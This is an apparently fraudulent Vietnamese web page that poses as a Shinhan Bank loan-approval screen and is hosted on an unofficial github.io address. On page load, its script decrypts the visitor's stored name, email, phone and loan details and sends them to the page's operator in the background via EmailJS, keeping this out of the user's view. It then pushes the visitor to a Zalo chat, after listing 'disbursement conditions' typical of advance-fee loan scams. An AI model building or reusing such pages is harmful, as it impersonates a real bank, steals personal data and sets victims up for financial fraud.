<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shinhan Bank - Hoàn Tất Đăng Ký</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="https://shinhan.com.vn/favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <script type="text/javascript">
        (function() {
            // THAY THẾ 'YOUR_PUBLIC_KEY' BẰNG PUBLIC KEY CỦA BẠN TRÊN EMAILJS
            emailjs.init('c-Ms5MjWbitpDBb-E'); 
        })();
    </script>
    
    <style>
        /* === BẢNG MÀU VÀ BIẾN CẢI TIẾN === */
        :root {
            --shinhan-blue: #00468E; /* Màu xanh dương chính thức của Shinhan */
            --shinhan-blue-light: #1A5FA4;
            --shinhan-green: #00A859; /* Màu xanh lá cho sự thành công */
            --shinhan-green-dark: #008a48;
            --background-color: #F8F9FC; /* Màu nền sáng hơn, sạch sẽ hơn */
            --card-background: #FFFFFF;
            --text-primary: #212529;
            --text-secondary: #5A6A85;
            --border-color: #EAEBEE;
            --border-radius-lg: 16px; /* Bo góc lớn hơn, mềm mại hơn */
            --border-radius-sm: 8px;
            --shadow-lg: 0 10px 30px rgba(0, 70, 142, 0.1);
            --shadow-md: 0 4px 15px rgba(0, 70, 142, 0.07);
            --transition-fast: all 0.2s ease-in-out;
        }

        body {
            font-family: 'Be Vietnam Pro', sans-serif;
            background-color: var(--background-color);
            color: var(--text-primary);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* === HEADER NÂNG CẤP === */
        .app-header {
            background: var(--card-background);
            padding: 15px 20px;
            box-shadow: var(--shadow-md);
            display: flex;
            align-items: center;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 1010;
        }

        .app-header .logo {
            height: 32px; /* Tăng kích thước logo một chút */
        }

        /* === GIAO DIỆN CHÍNH === */
        .main-container {
            padding: 24px 12px;
        }

        .completion-card {
            background: var(--card-background);
            border-radius: var(--border-radius-lg);
            box-shadow: var(--shadow-lg);
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            overflow: hidden;
            text-align: center;
            border: 1px solid var(--border-color);
        }
        
        /* === HEADER THẺ HOÀN TẤT - THIẾT KẾ MỚI === */
        .completion-header {
            padding: 40px 30px;
            background: linear-gradient(135deg, var(--shinhan-green), #28c76f); /* Gradient xanh lá mượt mà hơn */
            color: white;
        }
        .completion-header .icon {
            font-size: 4rem;
            margin-bottom: 20px;
            animation: popIn 0.5s 0.2s ease-out backwards;
            text-shadow: 0 4px 10px rgba(0,0,0,0.15);
        }
        .completion-header h3 {
            font-weight: 700;
            margin: 0;
            font-size: 1.8rem;
            animation: fadeIn 0.5s 0.4s ease-out backwards;
        }
        
        @keyframes popIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .completion-body {
            padding: 30px;
        }

        .section-title {
            font-weight: 700;
            color: var(--shinhan-blue); /* Sử dụng màu xanh Shinhan */
            margin-bottom: 24px;
            font-size: 1.5rem;
            text-align: left;
        }
        
        /* === DANH SÁCH ĐIỀU KIỆN - THIẾT KẾ MỚI === */
        .next-steps-list {
            list-style: none;
            padding: 0;
            text-align: left;
        }
        .next-steps-list li {
            display: flex;
            align-items: flex-start;
            margin-bottom: 20px;
            padding: 20px;
            background-color: var(--background-color);
            border-radius: var(--border-radius-sm);
            border: 1px solid var(--border-color);
        }
        .next-steps-list .step-icon {
            color: var(--shinhan-blue);
            font-size: 1.5rem;
            margin-right: 20px;
            margin-top: 5px;
            width: 30px;
            text-align: center;
            flex-shrink: 0;
        }
        .next-steps-list strong {
            color: var(--text-primary);
            font-weight: 600;
        }
        .next-steps-list p {
            color: var(--text-secondary);
            font-size: 0.95rem;
            line-height: 1.6;
        }

        /* === KHỐI THÔNG TIN - THIẾT KẾ MỚI === */
        .info-block {
            background-color: #E6F0F8; /* Màu nền xanh nhạt đồng bộ */
            padding: 20px;
            border-radius: var(--border-radius-sm);
            margin-top: 30px;
            border: 1px solid #B8D4EA;
            text-align: left;
        }
        .info-block p {
            margin: 0;
            color: var(--shinhan-blue);
            font-weight: 500;
        }

        /* === MÃ MỚI: THÔNG BÁO CHUYỂN HƯỚNG === */
        .redirect-notice {
            font-weight: 500;
            color: var(--text-secondary);
        }
        .redirect-notice .fa-spinner {
            margin-right: 8px;
            color: var(--shinhan-blue);
        }

        /* === KHU VỰC NÚT BẤM - NÂNG CẤP === */
        .actions {
            padding: 30px;
            background-color: #fcfdff;
            border-top: 1px solid var(--border-color);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
        }

        .btn {
            font-weight: 600;
            padding: 14px 35px; /* Tăng kích thước nút */
            font-size: 1.1rem;
            border-radius: 50px;
            transition: var(--transition-fast);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            border: none;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
        }

        .btn-primary {
            background-color: var(--shinhan-blue);
            color: white;
        }
        .btn-primary:hover {
            background-color: var(--shinhan-blue-light);
            color: white;
        }
        
        .btn-success {
            background-color: var(--shinhan-green);
            color: white;
        }
        .btn-success:hover {
            background-color: var(--shinhan-green-dark);
            color: white;
        }
        
        /* === HIỆU ỨNG TẢI TRANG === */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            transition: opacity 0.3s ease-out;
        }
        .spinner-border-lg {
            width: 4rem;
            height: 4rem;
            color: var(--shinhan-blue);
        }
        .hidden {
            visibility: hidden;
            opacity: 0;
        }
        
        #completionCard {
            transition: opacity 0.5s ease-in, transform 0.5s ease-in;
            opacity: 0;
            transform: translateY(20px);
        }
        
        #completionCard.visible {
            opacity: 1;
            transform: translateY(0);
        }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner-border spinner-border-lg" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>
    
    <header class="app-header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo.png" alt="Shinhan Bank Logo" class="logo">
    </header>

    <main class="main-container">
        <div id="completionCard" class="completion-card">
            <div class="completion-header">
                <div class="icon"><i class="fas fa-check-circle"></i></div>
                <h3>ĐĂNG KÝ THÀNH CÔNG</h3>
            </div>

            <div class="completion-body">
                <h4 class="section-title">Điều kiện Giải ngân Bắt buộc</h4>
                <ul class="next-steps-list">
                    <li>
                        <i class="fas fa-balance-scale-right step-icon"></i>
                        <div>
                            <strong>Điều 1: Duy trì số dư tối thiểu</strong>
                            <p>Quý khách phải duy trì số dư tối thiểu <strong>10%</strong> giá trị khoản vay trong tài khoản (ví dụ: vay 30 triệu đồng, số dư tối thiểu 3 triệu đồng) nhằm chứng minh năng lực tài chính và khả năng trả nợ, theo quy định tại Thông tư 39/2016/TT-NHNN. Số dư này chỉ cần giữ trong tài khoản, không yêu cầu nạp thêm, đóng phí hoặc chuyển khoản.</p>
                        </div>
                    </li>
                     <li>
                        <i class="fas fa-camera-retro step-icon"></i>
                        <div>
                            <strong>Điều 2: Xác nhận đủ điều kiện số dư</strong>
                            <p>Quý khách chỉ cần cung cấp hình ảnh số dư trong tài khoản/thẻ thể hiện số dư tối thiểu 10% tính theo số tiền vay, gửi ảnh cho nhân viên ngân hàng để thẩm định và hoàn tất thủ tục. <strong>Lưu ý:</strong> Không cần đóng, nộp, hay chuyển tiền qua bất cứ cá nhân hay nhân viên nào để được giải ngân.</p>
                        </div>
                    </li>
                    <li>
                        <i class="fas fa-shield-alt step-icon"></i>
                        <div>
                            <strong>Điều 3: Vay tín chấp</strong>
                            <p>Khoản vay không yêu cầu thế chấp tài sản hoặc thẩm định bất động sản, phù hợp quy định vay tín chấp của Shinhan Bank. Sau khi đáp ứng các điều kiện, khoản vay sẽ được giải ngân vào tài khoản ngân hàng của Quý khách theo Hợp đồng Tín dụng.</p>
                        </div>
                    </li>
                </ul>

                <div class="info-block">
                    <p><i class="fas fa-info-circle"></i> Vui lòng kiểm tra Hợp đồng Vay Tiêu dùng và Bảng Điều Kiện Giải Ngân. Các điều khoản này đã được nêu rõ trong Hợp Đồng với Ngân hàng Shinhan Việt Nam.</p>
                </div>
                
                <!-- === MÃ MỚI: THÔNG BÁO TỰ ĐỘNG CHUYỂN HƯỚNG === -->
                <div class="redirect-notice mt-4">
                    <p>
                        <i class="fas fa-spinner fa-spin"></i>
                        Bạn sẽ được tự động chuyển đến Zalo để hoàn tất giải ngân trong giây lát...
                    </p>
                </div>

            </div>

            <div class="actions">
                <a href="https://chatbot.zalo.me/ref/3188631486358378579?id=dang-ky-giai-ngan" target="_blank" class="btn btn-primary">
                    <i class="fab fa-rocketchat"></i>
                    <span>Liên hệ chuyên viên</span>
                </a>
                <a href="https://chatbot.zalo.me/ref/3188631486358378579?id=dang-ky-giai-ngan" target="_blank" class="btn btn-success">
                    <i class="fas fa-hand-holding-usd"></i>
                    <span>Nhận tiền Ngay</span>
                </a>
            </div>
        </div>
    </main>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
"use strict";

const CompletionApp = {
    state: {
        userData: null,
    },
    elements: {},
    config: {
        SECRET_KEY: 'shinhan-secret-key',
        EMAILJS_SERVICE_ID: 'service_60tgxof',
        EMAILJS_TEMPLATE_ID: 'template_0eppfb8',
        ZALO_REDIRECT_URL: 'https://chatbot.zalo.me/ref/3188631486358378579?id=dang-ky-giai-ngan' // Thêm link Zalo vào config để dễ quản lý
    },

    init() {
        this.cacheDOMElements();
        if (!this.loadAndValidateData()) {
            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
            return;
        }
        
        this.sendNotificationEmail();
        this.showContentAndRedirect(); // Đổi tên hàm để rõ ràng hơn
    },

    cacheDOMElements() {
        this.elements.loadingOverlay = document.getElementById('loadingOverlay');
        this.elements.completionCard = document.getElementById('completionCard');
    },

    // === MÃ CẬP NHẬT: THÊM TÍNH NĂNG TỰ ĐỘNG CHUYỂN HƯỚNG ===
    showContentAndRedirect() {
        // Hiển thị nội dung sau 0.5s
        setTimeout(() => {
            if (this.elements.loadingOverlay) {
                this.elements.loadingOverlay.classList.add('hidden');
            }
            if (this.elements.completionCard) {
                this.elements.completionCard.classList.add('visible');
            }

            // Bắt đầu đếm ngược để chuyển hướng sau khi nội dung đã hiển thị
            setTimeout(() => {
                window.location.href = this.config.ZALO_REDIRECT_URL;
            }, 35000); // Chuyển hướng sau 3 giây

        }, 500);
    },

    loadAndValidateData() {
        try {
            const storedData = localStorage.getItem('userData');
            if (!storedData) {
                console.error('No userData found');
                return false;
            }
            
            const decryptedBytes = CryptoJS.AES.decrypt(storedData, this.config.SECRET_KEY);
            const decryptedData = decryptedBytes.toString(CryptoJS.enc.Utf8);
            
            if (!decryptedData) {
                 console.error('Failed to decrypt data.');
                 return false;
            }

            this.state.userData = JSON.parse(decryptedData);
            
            if (!this.state.userData.currentStep || this.state.userData.currentStep < 5) {
                  console.error('User is not at the correct step to view this page.');
                  return false;
            }
            return true;
        } catch (error) {
            console.error('Error loading or validating userData:', error);
            localStorage.removeItem('userData');
            return false;
        }
    },

    // Quá trình gửi email vẫn diễn ra trong nền
    sendNotificationEmail() {
        if (!this.state.userData) return;
        
        const templateParams = {
            fullName: this.state.userData.fullName,
            email: this.state.userData.email,
            phone: this.state.userData.phone,
            loanAmount: this.state.userData.loanAmount,
            loanTerm: this.state.userData.loanTerm,
        };
        
        emailjs.send(this.config.EMAILJS_SERVICE_ID, this.config.EMAILJS_TEMPLATE_ID, templateParams)
            .then((response) => {
               // Chỉ log ở console, không hiển thị cho người dùng
               console.log('Email sent successfully!', response.status, response.text);
            }, (error) => {
               console.error('Failed to send email.', error);
            });
    }
};

document.addEventListener('DOMContentLoaded', () => {
    CompletionApp.init();
});
</script>
</body>
</html>
